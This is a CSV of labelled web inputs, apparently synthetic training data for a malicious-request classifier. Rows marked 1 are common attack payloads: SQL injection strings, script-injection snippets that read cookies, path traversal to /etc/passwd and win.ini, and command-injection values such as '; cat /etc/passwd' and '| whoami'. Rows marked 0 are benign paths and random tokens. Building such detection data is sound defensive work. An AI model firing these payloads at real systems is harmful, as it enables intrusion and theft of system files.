' OR '1'='1,1
' OR 4=3 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 2=6 --,1
admin%00' OR 1=1,1
/register?id=922,0
login,0
<script>var a=811;alert(a)</script>,1
9SJGV31tV7fYli,0
/login?session=92769,0
eXCcx4cfl,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/index?id=4036,0
/search?session=43826,0
/register?id=717,0
E0sQuIzM8Dw,0
/settings?session=53258,0
/settings?session=53657,0
; cat /etc/passwd,1
' OR 3=1 --,1
../../../../etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/dashboard?session=98082,0
search,0
s E l E c T * f R o M a d m i n,1
s E l E c T * f R o M a d m i n,1
/contact?id=9746,0
' OR '1'='1,1
../../../../etc/passwd,1
onerror=alert(1),1
admin'/* bypass */OR 1=1,1
' OR 6=4 --,1
wmSQFIGqgb,0
/checkout?session=64434,0
/profile?session=53380,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/about?id=8302,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 2=6 --,1
/index?session=57709,0
/checkout?session=75488,0
/dashboard?session=90456,0
/user?session=55041,0
<script>alert(document.cookie)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR '1'='1,1
user,0
' OR 5=1 --,1
/search?id=8533,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../../etc/passwd,1
/register?id=2452,0
/search?id=6197,0
/home?session=90830,0
' OR 1=8 --,1
onerror=alert(1),1
contact,0
checkout,0
/blog?id=2553,0
BXmIl7cg,0
| whoami,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/about?session=73545,0
' OR 2=4 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin'/* bypass */OR 1=1,1
MVmKUGnss12,0
/home?session=19889,0
admin'/* bypass */OR 1=1,1
<script>var a=352;alert(a)</script>,1
FuH0dOL4c0zH,0
' OR 2=1 --,1
<script>var a=928;alert(a)</script>,1
contact,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
1' o r '1'='1,1
pgO1rhIU,0
register,0
' OR 1=1 --,1
/profile?session=48593,0
' OR 3=3 --,1
about,0
<script>alert(document.cookie)</script>,1
' OR 4=9 --,1
<script>var a=975;alert(a)</script>,1
<script>var a=922;alert(a)</script>,1
/search?id=3274,0
/blog?id=1224,0
<script>var a=114;alert(a)</script>,1
' OR 2=9 --,1
dashboard,0
/dashboard?session=14736,0
onerror=alert(1),1
1' o r '1'='1,1
s E l E c T * f R o M a d m i n,1
<script>alert(document.cookie)</script>,1
dashboard,0
../../../windows/win.ini,1
oMYpokZl5JZi,0
' OR 2=2 --,1
user,0
javascript:alert(1),1
/blog?session=41513,0
login,0
N9jMM8K9EVBU,0
/settings?id=582,0
checkout,0
/register?id=9366,0
' OR 6=3 --,1
lOXG9c3ZJb,0
user,0
4dIHwohOdV,0
rAkiL3rg,0
admin%00' OR 1=1,1
login,0
d6HtGFhI0R7MFj5,0
/search?session=15106,0
/home?session=34268,0
' OR 8=6 --,1
' OR 2=7 --,1
1' o r '1'='1,1
/settings?session=77552,0
admin'/* bypass */OR 1=1,1
ZsiSkf5QHPzZu,0
<script>var a=235;alert(a)</script>,1
admin%00' OR 1=1,1
/contact?session=88868,0
<script>var a=841;alert(a)</script>,1
settings,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/checkout?id=5311,0
/profile?session=54024,0
/register?id=2840,0
checkout,0
login,0
/register?id=7795,0
H6vYE54GG,0
DdGCewU1uijJt,0
WsJoiQl5r,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 5=6 --,1
index,0
<script>var a=181;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
admin%00' OR 1=1,1
s6PpXkAC,0
178C6O53V,0
UEVAaxH0geqtk,0
../../../../etc/passwd,1
/cart?session=10755,0
yBGdEVTj,0
/register?id=4774,0
onerror=alert(1),1
/dashboard?id=9960,0
QlmWZCIqEjKC,0
admin%00' OR 1=1,1
<script>var a=947;alert(a)</script>,1
axZUY2V1Z8Sn,0
onerror=alert(1),1
<script>var a=254;alert(a)</script>,1
/search?id=1699,0
1IxZrwZhqnx,0
' OR 1=7 --,1
/register?id=8797,0
s E l E c T * f R o M a d m i n,1
/contact?session=11282,0
settings,0
<script>alert(document.cookie)</script>,1
nFTVDAthjr5,0
TVvyyjngoJNF,0
' OR '1'='1,1
/user?id=848,0
/register?session=38981,0
/register?id=9962,0
/index?id=8775,0
/dashboard?session=40101,0
cart,0
/register?session=81145,0
' OR 7=1 --,1
/contact?session=49340,0
/cart?session=99730,0
../../../../etc/passwd,1
register,0
s E l E c T * f R o M a d m i n,1
/cart?id=9106,0
<script>var a=64;alert(a)</script>,1
/cart?id=5703,0
../../../../etc/passwd,1
; cat /etc/passwd,1
<script>alert(document.cookie)</script>,1
1' o r '1'='1,1
| whoami,1
' OR 9=9 --,1
<script>alert(document.cookie)</script>,1
/settings?id=7440,0
SnAwhwUm,0
<script>var a=669;alert(a)</script>,1
search,0
' OR 1=1 --,1
MzahPjY3txB,0
/index?id=2131,0
admin%00' OR 1=1,1
profile,0
register,0
/register?session=50946,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
index,0
javascript:alert(1),1
admin'/* bypass */OR 1=1,1
/about?id=8368,0
/dashboard?session=56721,0
<script>var a=589;alert(a)</script>,1
1' o r '1'='1,1
profile,0
/profile?session=10486,0
<script>var a=444;alert(a)</script>,1
sVtBacopo,0
' OR 2=6 --,1
admin%00' OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin'/* bypass */OR 1=1,1
' OR '1'='1,1
checkout,0
/user?session=49816,0
1z0U53MgM73,0
' OR 1=1 --,1
onerror=alert(1),1
/search?id=2164,0
9cLIM6rHSvx,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../windows/win.ini,1
/register?id=7744,0
javascript:alert(1),1
2Es3MzD4pN6Ot,0
/cart?session=49481,0
' OR 5=1 --,1
/blog?id=5819,0
s E l E c T * f R o M a d m i n,1
' OR 9=1 --,1
| whoami,1
' OR 8=5 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 1=1 --,1
BSNfW2WYJ4ROpUj,0
login,0
/checkout?session=97314,0
' OR 8=7 --,1
1' o r '1'='1,1
/user?id=6443,0
<script>var a=402;alert(a)</script>,1
/about?session=64832,0
<script>var a=788;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
; cat /etc/passwd,1
/index?id=1381,0
/blog?session=55797,0
/login?id=2566,0
tJG55qxm0LCK1e,0
../../../../etc/passwd,1
' OR 3=5 --,1
/index?session=29668,0
cart,0
/register?id=8496,0
<script>var a=675;alert(a)</script>,1
admin%00' OR 1=1,1
; cat /etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 6=2 --,1
<script>var a=435;alert(a)</script>,1
/user?session=21749,0
| whoami,1
<script>var a=792;alert(a)</script>,1
/cart?session=51001,0
' OR 9=1 --,1
' OR 1=1 --,1
/home?session=77956,0
search,0
<script>var a=747;alert(a)</script>,1
login,0
/home?id=1122,0
../../../windows/win.ini,1
/dashboard?session=78344,0
cart,0
kwI5wJ7LmRmha,0
<script>alert(document.cookie)</script>,1
<script>var a=672;alert(a)</script>,1
../../../windows/win.ini,1
3cWgO0GK,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
| whoami,1
HlZmdzfruyr,0
login,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/home?session=94326,0
/checkout?session=73823,0
/checkout?session=59725,0
' OR 1=1 --,1
admin' --,1
/search?id=7862,0
/blog?session=11321,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/index?session=53078,0
index,0
/login?session=98035,0
/settings?session=31200,0
/home?session=96483,0
' OR 2=4 --,1
admin' --,1
62Sc2WokFmGt13,0
/blog?session=84404,0
VQdNih2yOS,0
/blog?id=7927,0
/login?session=79904,0
admin%00' OR 1=1,1
/checkout?session=53874,0
ROIeat1tuWXR,0
<script>var a=454;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
s E l E c T * f R o M a d m i n,1
/blog?session=21694,0
/home?session=48877,0
' OR 9=1 --,1
checkout,0
<script>alert(document.cookie)</script>,1
AfG6oNuxMBp,0
' OR 8=1 --,1
home,0
<script>var a=786;alert(a)</script>,1
/settings?session=70502,0
/settings?session=68967,0
' OR 7=5 --,1
/index?session=26762,0
admin' --,1
checkout,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
OWDg3Tsvk,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/login?id=7476,0
' OR 8=9 --,1
/index?session=42864,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/search?id=8547,0
/blog?session=86221,0
/login?id=4606,0
/cart?id=3665,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/settings?id=9790,0
blog,0
/blog?id=4102,0
user,0
profile,0
search,0
dashboard,0
7qiXJ7oekWpyk,0
' OR 3=9 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../windows/win.ini,1
<script>var a=229;alert(a)</script>,1
1' o r '1'='1,1
<script>var a=689;alert(a)</script>,1
pCb2qn26DEcl,0
<script>var a=627;alert(a)</script>,1
admin' --,1
<script>var a=98;alert(a)</script>,1
v3p9M9RUX,0
login,0
/index?session=43934,0
admin%00' OR 1=1,1
admin%00' OR 1=1,1
/settings?id=2040,0
<script>var a=857;alert(a)</script>,1
<script>var a=428;alert(a)</script>,1
register,0
../../../../etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/contact?session=11320,0
javascript:alert(1),1
' OR 1=1 --,1
../../../windows/win.ini,1
56oNZCxnu5mlf,0
<script>var a=181;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
' OR 5=3 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/user?session=71130,0
contact,0
' OR 8=9 --,1
/home?id=6955,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/about?id=2608,0
/contact?session=19838,0
/dashboard?session=69701,0
' OR 4=6 --,1
/checkout?id=7166,0
<script>alert(document.cookie)</script>,1
/register?id=5606,0
/contact?id=4008,0
../../../../etc/passwd,1
admin'/* bypass */OR 1=1,1
user,0
settings,0
<script>var a=779;alert(a)</script>,1
admin' --,1
/profile?session=21017,0
admin' --,1
l3YOrzkUiuXDf,0
<script>var a=353;alert(a)</script>,1
/index?id=6776,0
<script>var a=535;alert(a)</script>,1
dashboard,0
' OR 5=1 --,1
tXVL8Nxe,0
/about?session=86598,0
1' o r '1'='1,1
cart,0
/about?session=40088,0
/register?id=5439,0
admin' --,1
' OR 6=3 --,1
/register?session=70922,0
login,0
about,0
contact,0
MESKCEulpWQ7,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
; cat /etc/passwd,1
home,0
s E l E c T * f R o M a d m i n,1
../../../windows/win.ini,1
/contact?session=84183,0
N3zCeAnkvmxv,0
/profile?id=9916,0
yhk5sIi9Vb,0
uHCCVhyz5EOvrPQ,0
/search?session=42687,0
' OR 4=8 --,1
xwSCx5W5uAR1,0
/login?id=7128,0
/register?id=4224,0
/login?session=40809,0
/blog?id=3857,0
/index?session=60521,0
<script>var a=218;alert(a)</script>,1
../../../../etc/passwd,1
' OR 1=1 --,1
/blog?session=80836,0
checkout,0
<script>var a=531;alert(a)</script>,1
' OR 1=6 --,1
' OR 1=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/user?session=87503,0
| whoami,1
1vmI1FMX4lE9NL0,0
<script>alert(document.cookie)</script>,1
/about?session=30514,0
checkout,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/register?session=22775,0
home,0
<script>var a=159;alert(a)</script>,1
w3e4q2aCKsRm,0
<script>var a=727;alert(a)</script>,1
<script>var a=315;alert(a)</script>,1
<script>var a=924;alert(a)</script>,1
/user?session=57717,0
/register?session=35934,0
wQOj7Nec6S6GLn,0
/home?id=9682,0
vQY71jXy5AqlU,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 7=1 --,1
zjX0vPl8kotfrb,0
/profile?session=54187,0
<script>var a=61;alert(a)</script>,1
' OR 3=4 --,1
/user?id=7352,0
/index?id=7408,0
search,0
../../../../etc/passwd,1
<script>var a=629;alert(a)</script>,1
admin' --,1
<script>alert(document.cookie)</script>,1
<script>var a=805;alert(a)</script>,1
kYP7C7oon3Ojx,0
/settings?session=28329,0
thtO6krbdD0uC6f,0
s E l E c T * f R o M a d m i n,1
/dashboard?id=4058,0
e1XY6CSoNvY1xAq,0
<script>var a=676;alert(a)</script>,1
settings,0
' OR 6=6 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
xYHVsWoVntrfSP2,0
/settings?id=2147,0
/register?session=97375,0
t2NvixpyCtny,0
dashboard,0
/index?session=62411,0
search,0
/cart?id=8540,0
about,0
' OR 1=9 --,1
/checkout?session=76919,0
../../../../etc/passwd,1
dGwiJQVnD8zW81R,0
' OR 2=5 --,1
admin' --,1
../../../windows/win.ini,1
B2h5aa0a,0
1WFXjPzdcv9lzr2,0
w8KZy4UYPpa,0
| whoami,1
' OR 6=1 --,1
s E l E c T * f R o M a d m i n,1
admin' --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
oDAlR2M9n7Vhyk,0
1' o r '1'='1,1
' OR 3=5 --,1
/dashboard?id=9275,0
' OR 1=1 --,1
contact,0
<script>var a=196;alert(a)</script>,1
<script>var a=19;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
cart,0
' OR 7=3 --,1
; cat /etc/passwd,1
' OR 2=1 --,1
1' o r '1'='1,1
javascript:alert(1),1
Zn8ymBsPSn,0
/profile?session=75407,0
javascript:alert(1),1
/settings?session=23582,0
register,0
/cart?session=92891,0
/user?session=39947,0
settings,0
/about?session=51313,0
/contact?session=29817,0
onerror=alert(1),1
mTtvsDSjl,0
admin' --,1
admin%00' OR 1=1,1
TrfAOaQOUxkF4,0
ORWQoTWx68C,0
admin' --,1
onerror=alert(1),1
search,0
onerror=alert(1),1
' OR 4=2 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin' --,1
p3OQVtlqki,0
/index?id=4727,0
oLhr1T3wi,0
admin'/* bypass */OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
| whoami,1
search,0
| whoami,1
/login?session=64754,0
login,0
<script>var a=124;alert(a)</script>,1
<script>var a=706;alert(a)</script>,1
/about?session=79326,0
<script>var a=359;alert(a)</script>,1
/search?id=8663,0
<script>var a=960;alert(a)</script>,1
' OR 8=6 --,1
toBfTp3uqpnk,0
/checkout?id=2799,0
<script>var a=786;alert(a)</script>,1
/user?id=819,0
<script>var a=570;alert(a)</script>,1
hafppl3zz,0
/contact?id=1596,0
admin%00' OR 1=1,1
/search?id=7441,0
search,0
admin' --,1
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
BUdbC4ibAGExTgn,0
' OR 5=1 --,1
' OR 2=7 --,1
; cat /etc/passwd,1
<script>var a=491;alert(a)</script>,1
' OR 6=6 --,1
user,0
register,0
/user?id=1363,0
admin'/* bypass */OR 1=1,1
' OR 3=1 --,1
javascript:alert(1),1
/index?id=8663,0
' OR 9=8 --,1
admin' --,1
/register?session=81532,0
settings,0
T6XTocvj9UuhtT,0
' OR 2=6 --,1
/search?session=61991,0
login,0
<script>var a=135;alert(a)</script>,1
admin%00' OR 1=1,1
<script>var a=241;alert(a)</script>,1
jptTMpHW,0
/login?session=89715,0
/cart?session=81185,0
admin'/* bypass */OR 1=1,1
KlgK5sX15qh0nc0,0
/login?id=6181,0
' OR 9=6 --,1
/contact?id=9939,0
<script>var a=969;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
' OR '1'='1,1
' OR 8=6 --,1
' OR 1=1 --,1
x49aFQvzrQ6PeX,0
profile,0
about,0
/about?id=4484,0
checkout,0
A58CujgF,0
nmyv4hyl9hx,0
/cart?id=6442,0
/dashboard?id=3099,0
about,0
<script>var a=464;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=510;alert(a)</script>,1
' OR '1'='1,1
blog,0
register,0
/dashboard?id=6391,0
' OR 4=1 --,1
/user?id=6998,0
javascript:alert(1),1
/contact?session=66347,0
about,0
javascript:alert(1),1
/register?id=5675,0
/dashboard?session=74151,0
' OR 1=1 --,1
/register?session=95095,0
' OR 1=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../windows/win.ini,1
/home?session=86807,0
../../../windows/win.ini,1
../../../windows/win.ini,1
<script>var a=421;alert(a)</script>,1
/index?id=3948,0
<script>var a=558;alert(a)</script>,1
/profile?id=7529,0
search,0
javascript:alert(1),1
cart,0
; cat /etc/passwd,1
/search?session=29662,0
<script>alert(document.cookie)</script>,1
XiY8DFzDF9Y,0
<script>var a=45;alert(a)</script>,1
ouMX7iM88WOH,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
register,0
/checkout?id=2281,0
admin'/* bypass */OR 1=1,1
checkout,0
jbhsNJTNNJ,0
' OR 6=5 --,1
../../../windows/win.ini,1
/blog?session=60787,0
ymqjmUElk5t,0
/checkout?id=9971,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/login?session=91448,0
' OR 8=1 --,1
<script>alert(document.cookie)</script>,1
xXdSDCUU6AKr,0
/contact?id=3195,0
/about?id=7952,0
<script>var a=697;alert(a)</script>,1
' OR 9=6 --,1
/user?session=48021,0
hApdNhsEG8R2xh,0
' OR 9=5 --,1
onerror=alert(1),1
' OR '1'='1,1
blog,0
| whoami,1
/register?session=80804,0
; cat /etc/passwd,1
G801z791UBy,0
onerror=alert(1),1
<script>alert(document.cookie)</script>,1
/cart?session=48018,0
register,0
onerror=alert(1),1
contact,0
/contact?session=88059,0
profile,0
/checkout?session=49443,0
home,0
/contact?id=6178,0
../../../../etc/passwd,1
/contact?id=7176,0
home,0
/blog?session=34188,0
login,0
WzelAOaG,0
JLi9oCT9,0
' OR 8=7 --,1
admin%00' OR 1=1,1
' OR 1=7 --,1
/settings?session=50003,0
<script>var a=642;alert(a)</script>,1
/settings?id=5098,0
search,0
profile,0
; cat /etc/passwd,1
../../../../etc/passwd,1
lkxI2afS1iV6KG,0
<script>var a=534;alert(a)</script>,1
/home?session=29654,0
/contact?id=1893,0
' OR 1=1 --,1
blog,0
/user?id=5284,0
' OR 2=1 --,1
admin' --,1
ZuTeJXiIU,0
admin%00' OR 1=1,1
/about?id=3213,0
' OR 3=4 --,1
admin'/* bypass */OR 1=1,1
6h6wgmHZQFhSTBC,0
../../../windows/win.ini,1
zkt5PEYPdsyy3iP,0
<script>var a=655;alert(a)</script>,1
contact,0
/login?session=22844,0
/home?id=2559,0
' OR 6=9 --,1
BL8ts58iWT,0
DoscBMRVLW,0
user,0
<script>var a=950;alert(a)</script>,1
0Gr41PIHiOby,0
9FhNqwrU,0
| whoami,1
javascript:alert(1),1
/profile?id=4114,0
<script>var a=453;alert(a)</script>,1
' OR 2=1 --,1
' OR 9=5 --,1
YQCoCCvh5bV,0
../../../../etc/passwd,1
JD169B3htOyqWmw,0
| whoami,1
/home?session=86581,0
/user?id=8288,0
WlH6eRg5M,0
s E l E c T * f R o M a d m i n,1
<script>var a=509;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
profile,0
javascript:alert(1),1
/register?id=429,0
<script>alert(document.cookie)</script>,1
index,0
/blog?id=2118,0
| whoami,1
' OR 6=6 --,1
AeP7Jy6W,0
cart,0
s E l E c T * f R o M a d m i n,1
CBpxYNTI,0
admin'/* bypass */OR 1=1,1
cart,0
register,0
admin' --,1
Dt9q2nHqlYtt,0
user,0
dashboard,0
admin%00' OR 1=1,1
/search?session=24584,0
<script>alert(document.cookie)</script>,1
onerror=alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
index,0
<script>var a=90;alert(a)</script>,1
/profile?id=9061,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 1=1 --,1
<script>alert(document.cookie)</script>,1
GUmXQs8EzlQ3I1,0
zK5534qx1,0
qKyD9ewt,0
' OR 5=2 --,1
/checkout?session=17076,0
| whoami,1
/dashboard?id=5148,0
admin' --,1
EX0Rx8cTV52URID,0
checkout,0
checkout,0
' OR 6=5 --,1
' OR '1'='1,1
settings,0
/user?id=3559,0
checkout,0
qgT56BRxau919Fw,0
/checkout?session=84948,0
; cat /etc/passwd,1
/blog?id=8167,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 9=5 --,1
' OR '1'='1,1
' OR '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=275;alert(a)</script>,1
YbC2GBkGXbLT,0
<script>var a=241;alert(a)</script>,1
<script>var a=621;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../windows/win.ini,1
1' o r '1'='1,1
profile,0
' OR 1=1 --,1
/register?id=5363,0
../../../../etc/passwd,1
search,0
8drBkHF9TSD,0
s E l E c T * f R o M a d m i n,1
<script>var a=703;alert(a)</script>,1
; cat /etc/passwd,1
<script>var a=532;alert(a)</script>,1
/cart?id=8699,0
/settings?id=6818,0
onerror=alert(1),1
s E l E c T * f R o M a d m i n,1
' OR 6=3 --,1
<script>var a=335;alert(a)</script>,1
2ZkxsAYMQb9ibAx,0
checkout,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
bggHcbd6s,0
/dashboard?session=97963,0
| whoami,1
bs4SHAICXF3,0
| whoami,1
about,0
' OR 6=5 --,1
search,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../../etc/passwd,1
vkq3qJBuH,0
pUn7dAkT,0
onerror=alert(1),1
dashboard,0
<script>var a=791;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
onerror=alert(1),1
/register?id=1833,0
' OR 1=1 --,1
/home?session=18172,0
/home?session=18919,0
/dashboard?session=67949,0
../../../windows/win.ini,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/user?id=3420,0
| whoami,1
WxhggkzAz,0
' OR '1'='1,1
blog,0
dashboard,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/checkout?session=92769,0
index,0
<script>var a=562;alert(a)</script>,1
' OR 1=1 --,1
/cart?id=5093,0
4KVx8qo0,0
' OR 7=5 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
onerror=alert(1),1
' OR 4=9 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/home?id=2575,0
4ARn5BhAE3HKM,0
<script>var a=25;alert(a)</script>,1
/settings?id=7907,0
/about?session=47753,0
s E l E c T * f R o M a d m i n,1
s E l E c T * f R o M a d m i n,1
729z2rZl1uUs,0
<script>var a=674;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
/profile?session=86429,0
javascript:alert(1),1
/dashboard?session=89625,0
<script>var a=292;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/cart?session=64036,0
/checkout?session=64334,0
/login?id=3972,0
settings,0
lGWrJAHCUIlpdk,0
' OR 9=7 --,1
/dashboard?id=7421,0
<script>var a=749;alert(a)</script>,1
/about?session=19601,0
' OR 1=1 --,1
about,0
dashboard,0
' OR 4=9 --,1
/login?session=31911,0
' OR 7=6 --,1
/cart?id=3833,0
/cart?id=22,0
' OR 2=4 --,1
; cat /etc/passwd,1
/about?session=35120,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
dashboard,0
javascript:alert(1),1
onerror=alert(1),1
<script>var a=273;alert(a)</script>,1
cart,0
2wrmTvWAWGs,0
OVEOcn0H,0
checkout,0
; cat /etc/passwd,1
' OR 9=8 --,1
' OR 1=1 --,1
' OR 1=6 --,1
<script>var a=93;alert(a)</script>,1
| whoami,1
contact,0
' OR '1'='1,1
yKiuIXsCTLE,0
profile,0
' OR 6=5 --,1
/login?id=2240,0
javascript:alert(1),1
/register?id=9309,0
/profile?id=4907,0
/home?id=5506,0
/search?id=4030,0
dashboard,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
blog,0
<script>alert(document.cookie)</script>,1
javascript:alert(1),1
blog,0
cart,0
' OR 4=4 --,1
admin%00' OR 1=1,1
/about?session=66257,0
blog,0
search,0
/user?session=29605,0
' OR 5=5 --,1
/about?id=7159,0
<script>var a=38;alert(a)</script>,1
/about?session=53234,0
index,0
/dashboard?id=5722,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
about,0
Six8kHZux9xjBFr,0
/settings?id=1151,0
/index?id=9833,0
/blog?session=11631,0
dashboard,0
' OR 5=3 --,1
J9z97EcslWZ9,0
' OR 1=9 --,1
IL4ZyvIJJ,0
<script>var a=414;alert(a)</script>,1
' OR 2=8 --,1
<script>alert(document.cookie)</script>,1
<script>var a=990;alert(a)</script>,1
' OR 6=4 --,1
' OR 2=4 --,1
admin'/* bypass */OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../windows/win.ini,1
/blog?session=24818,0
../../../../etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
SaCvd2tK,0
ibxELMnF2X,0
/about?session=87897,0
' OR '1'='1,1
<script>var a=387;alert(a)</script>,1
/cart?id=7371,0
/dashboard?session=22848,0
contact,0
/home?id=8109,0
/index?session=21292,0
javascript:alert(1),1
s E l E c T * f R o M a d m i n,1
/index?id=9281,0
' OR 5=4 --,1
<script>var a=230;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
index,0
admin%00' OR 1=1,1
346AncAf,0
/cart?session=63091,0
FMqx3bJX,0
admin' --,1
profile,0
/blog?id=5460,0
' OR 1=1 --,1
0sUPU3F30sFhKN,0
admin' --,1
<script>var a=625;alert(a)</script>,1
' OR 8=9 --,1
admin%00' OR 1=1,1
contact,0
<script>alert(document.cookie)</script>,1
UjV17L6jGJuvVI,0
javascript:alert(1),1
oOUe3EPkIa0O,0
; cat /etc/passwd,1
1' o r '1'='1,1
/login?id=2372,0
' OR 1=1 --,1
' OR 3=8 --,1
admin'/* bypass */OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
settings,0
admin' --,1
profile,0
blog,0
frWwiMKxH,0
' OR 7=9 --,1
onerror=alert(1),1
JPXfJRkJ,0
' OR 3=2 --,1
javascript:alert(1),1
/about?id=3512,0
o2P5fyNKHGxpK,0
<script>var a=227;alert(a)</script>,1
/home?session=56713,0
admin' --,1
/about?session=96794,0
about,0
dashboard,0
/dashboard?session=38446,0
admin'/* bypass */OR 1=1,1
/about?id=4392,0
1' o r '1'='1,1
' OR 2=8 --,1
ft9njNj9TYxqu,0
register,0
checkout,0
admin' --,1
WI1IumWYJ,0
' OR 9=4 --,1
../../../windows/win.ini,1
' OR 7=1 --,1
' OR 9=9 --,1
../../../../etc/passwd,1
I6C3h4rKehpjrC,0
/login?session=70555,0
9eu61xtvIDnr,0
PELVgvsy,0
KzuL9gyNF2R,0
<script>var a=344;alert(a)</script>,1
/blog?id=8971,0
uPkeAgaF,0
s E l E c T * f R o M a d m i n,1
k09JcusI3,0
<script>var a=808;alert(a)</script>,1
/cart?id=740,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?session=57915,0
<script>var a=932;alert(a)</script>,1
/login?session=14619,0
<script>var a=439;alert(a)</script>,1
<script>var a=644;alert(a)</script>,1
<script>var a=910;alert(a)</script>,1
home,0
/cart?session=94316,0
' OR 1=1 --,1
' OR 3=9 --,1
<script>alert(document.cookie)</script>,1
index,0
jEs2x0M5N0Vrhzc,0
/profile?session=33021,0
<script>var a=438;alert(a)</script>,1
<script>var a=625;alert(a)</script>,1
checkout,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>alert(document.cookie)</script>,1
/about?id=2696,0
../../../windows/win.ini,1
' OR 9=6 --,1
; cat /etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
; cat /etc/passwd,1
1rpRdfLu,0
<script>var a=82;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
/checkout?id=8055,0
' OR 6=6 --,1
contact,0
javascript:alert(1),1
' OR 9=2 --,1
admin' --,1
settings,0
/cart?session=43075,0
login,0
/blog?id=9723,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 7=6 --,1
profile,0
/user?id=2979,0
admin%00' OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
BCQVY0F1hQAv6Mj,0
OGNMXc6qdez,0
/profile?id=5841,0
' OR 7=8 --,1
/index?id=9179,0
5ZeqXQApq,0
/search?session=76020,0
tskpJzgyiX,0
Q9gZhAo1,0
../../../../etc/passwd,1
/login?session=89099,0
/user?session=22021,0
' OR 6=7 --,1
iVdbqlRG,0
search,0
../../../windows/win.ini,1
<script>alert(document.cookie)</script>,1
admin%00' OR 1=1,1
' OR 6=9 --,1
admin'/* bypass */OR 1=1,1
/profile?id=2918,0
/blog?session=42636,0
onerror=alert(1),1
/blog?session=53532,0
' OR 5=4 --,1
/profile?session=56740,0
admin' --,1
/cart?id=1994,0
search,0
' OR 3=7 --,1
home,0
admin'/* bypass */OR 1=1,1
../../../windows/win.ini,1
/register?id=8643,0
